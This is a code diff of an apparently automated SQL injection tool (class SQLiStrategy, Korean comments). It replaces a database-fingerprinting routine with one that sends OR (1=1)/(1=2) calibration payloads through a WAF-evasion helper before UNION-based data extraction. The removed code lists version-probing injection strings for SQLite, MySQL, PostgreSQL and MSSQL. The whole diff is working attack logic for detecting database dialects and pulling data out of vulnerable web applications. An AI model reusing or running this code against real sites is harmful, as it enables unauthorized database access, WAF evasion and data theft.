@@ -1202,7 +1202,11 @@ class SQLiStrategy(BaseStrategy):
                         'diff_chars':         diff_chars,
                         'waf_evaded':         waf_evaded,
                     }
-                    self._fingerprint_db(surface, base_fields, vuln_entry, quote_char, waf_hits, waf_evasions)
+                    # 방언 판별은 여기서 하지 않는다 — 예전 _fingerprint_db는 raw 응답 길이 +
+                    # "AND version LIKE '%'" 형이라, uid 동등비교(uid='%'가 매칭 0)인 앱에선 참/거짓이
+                    # 안 갈려 Unknown으로 실패했다. 이제 _go_enumerate가 UNION 추출 직전에 '확정된
+                    # boolean 오라클'(OR 기반, diff_score)로 판별한다 — blind에서 쓰는 _resolve_dialect와
+                    # 같은 견고한 방식으로 통일.
                     return vuln_entry
 
                 # 이 배치에서 확정된 신호가 없었다 — 배치 하나의 결과를 한 줄로 요약해서 남긴다.
@@ -1262,21 +1266,6 @@ class SQLiStrategy(BaseStrategy):
               f"클러스터간 최소diff={separation}(threshold={noise_threshold}) → "
               f"{'확정' if ok else '오탐 의심(리터럴 바꾸니 참/거짓 뭉침이 깨짐), 다음 페이로드로'}")
         return ok
-
-    def _fingerprint_db(self, surface, base_fields, vuln_entry: dict, quote_char: str,
-                         waf_hits: list, waf_evasions: list) -> None:
-        candidates = []
-        for db_name, (fp_true, fp_false) in self._build_fingerprint_payloads(quote_char).items():
-            t_status, t_body, _, _, _ = self._send_evading(surface, base_fields, fp_true, f'fingerprint({db_name},true)', waf_hits, waf_evasions)
-            f_status, f_body, _, _, _ = self._send_evading(surface, base_fields, fp_false, f'fingerprint({db_name},false)', waf_hits, waf_evasions)
-            true_len  = len(t_body) if t_status is not None else 0
-            false_len = len(f_body) if f_status is not None else 0
-            payload_len_diff = len(fp_true) - len(fp_false)
-            candidates.append((db_name, (true_len - false_len) - payload_len_diff))
-
-        if candidates:
-            best_db, best_diff = max(candidates, key=lambda x: x[1])
-            vuln_entry['detected_db'] = f'{best_db} (추정)' if best_diff > 5 else 'Unknown'
 
     # ── 5. 공격벡터 확인: enumerate → union reflect → union extract ─────────
 
@@ -1399,6 +1388,14 @@ class SQLiStrategy(BaseStrategy):
         # 탐색으로 넘어간다. 'Boolean-based로 탐지됨'은 그저 그 방식으로 처음 신호를 찾았다는
         # 뜻이지 "이 필드는 blind다"라는 확정이 아니므로, blind를 무조건 우선시키지 않는다.
         if union_col:
+            # UNION 추출 전에 방언을 확정한다 — _go_union_extract가 방언별로 다른 브랜치를 쓰기
+            # 때문(MySQL: database()/information_schema, SQLite: sqlite_master, PostgreSQL:
+            # current_database()). 확정된 boolean 오라클로 판별하며, 아직 방언이 없을 때만 한다
+            # (숫자형 경로는 이미 detected_db를 채워둠). 판별 실패 시에도 UNION은 기본(MySQL)
+            # 브랜치로 시도하고, 성공한 브랜치를 _go_union_extract가 detected_db에 기록한다.
+            if vuln_entry.get('detected_db') in (None, 'Unknown'):
+                self._resolve_dialect_for_union(surface, base_fields, injection_prefix, comment,
+                                                 vuln_entry, waf_hits, waf_evasions, page_noise)
             attack_vectors['UNION'] = {'possible': True, 'columns': union_col, 'order_by_payload': boundary_payload}
             vuln_entry['attack_vectors'] = attack_vectors
             self._go_union_reflect(surface, base_fields, union_col, comment, vuln_entry,
@@ -1624,11 +1621,13 @@ class SQLiStrategy(BaseStrategy):
         """에러 메시지도 안 보이고 SLEEP도 못 쓰는(또는 아직 안 한) blind 상황에서, 참/거짓
         오라클만으로 DB 방언(SQLite/MySQL/PostgreSQL)을 알아낸다.
 
-        known_db(보통 _fingerprint_db가 이미 채워둔 vuln_entry['detected_db'])가
+        known_db(이미 채워진 vuln_entry['detected_db'] — 숫자형 경로의 dialect 판별,
+        _resolve_dialect_for_union의 사전 판별, 또는 UNION 추출 성공 시 기록된 값)가
         SQL_DIALECTS에 있는 이름이면 그걸 그대로 재사용하고 요청을 전혀 안 보낸다 —
-        boolean 탐지로 확정된 필드는 이미 한 번 판별이 끝난 상태라 다시 물을 필요가 없다.
-        없거나(따옴표가 원천 차단돼 _fingerprint_db 자체가 못 돈 경우 등) 우리 방언
-        테이블에 없는 값('Unknown'/'MSSQL'/'Oracle')이면 직접 프로빙한다.
+        이미 한 번 판별이 끝난 필드는 다시 물을 필요가 없다. 없거나(아직 아무 경로도
+        방언을 못 정한 경우) 우리 방언 테이블에 없는 값('Unknown'/'MSSQL'/'Oracle')이면
+        직접 프로빙한다. (이 함수 자체가 예전 _fingerprint_db(raw 길이+AND-LIKE)를 대체한
+        견고한 오라클 기반 판별이다.)
 
         각 방언의 version_fn으로 "항상 참"/"항상 거짓" 조건을 만들어 실제로 참/거짓이
         갈리는지 본다 — 방언이 틀리면 그 함수가 없어서 쿼리 자체가 깨져 두 probe가 같은
@@ -1663,6 +1662,31 @@ class SQLiStrategy(BaseStrategy):
                 return dialect
         print(f"    [Blind] 방언 판별 실패 — SQLite/MySQL/PostgreSQL 중 어느 것도 안 맞음")
         return None
+
+    def _resolve_dialect_for_union(self, surface, base_fields, injection_prefix: str, comment: str,
+                                    vuln_entry: dict, waf_hits: list, waf_evasions: list,
+                                    page_noise: int) -> None:
+        """UNION 추출 직전에 방언을 확정해 vuln_entry['detected_db']에 채운다 — 예전 _fingerprint_db
+        (raw 길이 + AND-LIKE, 취약)를 대체한다. _blind_extract_boolean과 동일하게 OR (1=1)/(1=2)로
+        기준 텍스트를 잡아 content 오라클이 성립할 때만(캘리브레이션 diff ≥ 노이즈 문턱) _resolve_dialect
+        로 판별하고, 아니면 조용히 넘어간다(UNION은 기본 브랜치로 시도 → 성공 브랜치를 _go_union_extract
+        가 기록). blind로 넘어가는 경우 _resolve_dialect 캐시를 그대로 재사용한다."""
+        t_status, t_body, _, _, _ = self._send_evading(
+            surface, base_fields, f"{injection_prefix} OR (1=1) LIMIT 1 {comment} ", 'dialect(calib-true)', waf_hits, waf_evasions,
+        )
+        f_status, f_body, _, _, _ = self._send_evading(
+            surface, base_fields, f"{injection_prefix} OR (1=2) LIMIT 1 {comment} ", 'dialect(calib-false)', waf_hits, waf_evasions,
+        )
+        if t_status is None or f_status is None:
+            return
+        ref_true_text, ref_false_text = visible_text(t_body), visible_text(f_body)
+        if diff_score(ref_true_text, ref_false_text) < max(page_noise * 2, 1):
+            return  # content 오라클 미성립 — UNION 기본 브랜치로 두고 방언 판별 스킵
+        dialect = self._resolve_dialect(surface, base_fields, injection_prefix, comment,
+                                         ref_true_text, ref_false_text, waf_hits, waf_evasions,
+                                         known_db=vuln_entry.get('detected_db'))
+        if dialect:
+            vuln_entry['detected_db'] = dialect
 
     def _blind_extract_boolean(self, surface, base_fields, injection_prefix: str, comment: str, expr: str | None,
                                 waf_hits: list, waf_evasions: list,
@@ -1974,6 +1998,13 @@ class SQLiStrategy(BaseStrategy):
             match = re.search(r'~~([^~<]{1,256})~~', body)
             print(f"    [UnionExtract] label={label} status={status} match={match and match.group(1)}")
             if match:
+                # 이 추출이 성공한 브랜치의 방언 = 확정 지문. _fingerprint_db가 Unknown으로
+                # 실패했어도(예: uid 동등비교라 AND 기반 버전-LIKE 판별이 참/거짓을 못 가르는
+                # 앱), UNION 추출이 실제로 성공했다는 것 자체가 가장 강한 근거라 여기서
+                # detected_db를 확정한다(추가 요청 0). 그래야 요약에 'DB : MySQL' 등이 뜨고,
+                # blind를 안 탄 UNION 경로에서도 방언이 공란으로 남지 않는다.
+                if vuln_entry.get('detected_db') in (None, 'Unknown'):
+                    vuln_entry['detected_db'] = clean if clean in ('SQLite', 'PostgreSQL') else 'MySQL'
                 if label == 'db_name':
                     union_info['db_name'] = match.group(1)
                     union_info['db_name_payload'] = used_payload
@@ -2032,26 +2063,6 @@ class SQLiStrategy(BaseStrategy):
             true_c0, false_c0 = variants[style][0][0], variants[style][1][0]
             out.append((build(true_c0), build(false_c0), build, style))
         return out
-
-    @staticmethod
-    def _build_fingerprint_payloads(quote_char: str) -> dict[str, tuple[str, str]]:
-        """SQL_DIALECTS의 version_fn을 재사용한다 — _resolve_dialect()가 blind에서 쓰는
-        것과 같은 표현식이어야 두 판별 결과가 갈리지 않는다. MSSQL은 blind 추출용
-        방언 테이블(SQL_DIALECTS)엔 없어서(추출 문법 미지원 범위) 여기서만 하드코딩 유지."""
-        q = quote_char
-        sqlite_fn = SQL_DIALECTS['SQLite']['version_fn']
-        mysql_fn  = SQL_DIALECTS['MySQL']['version_fn']
-        pg_fn     = SQL_DIALECTS['PostgreSQL']['version_fn']
-        return {
-            'SQLite':     (f"%{q} AND {sqlite_fn} LIKE {q}%{q} --",
-                           f"%{q} AND {sqlite_fn} LIKE {q}XXXXX{q} --"),
-            'MySQL':      (f"%{q} AND {mysql_fn} LIKE {q}%{q} #",
-                           f"%{q} AND {mysql_fn} LIKE {q}XXXXX{q} #"),
-            'PostgreSQL': (f"%{q} AND {pg_fn} LIKE {q}%PostgreSQL%{q} --",
-                           f"%{q} AND {pg_fn} LIKE {q}%XXXXX%{q} --"),
-            'MSSQL':      (f"%{q} AND @@version LIKE {q}%Microsoft%{q} --",
-                           f"%{q} AND @@version LIKE {q}%XXXXX%{q} --"),
-        }
 
     # ── 결과 변환 ────────────────────────────────────────────────────────────
 
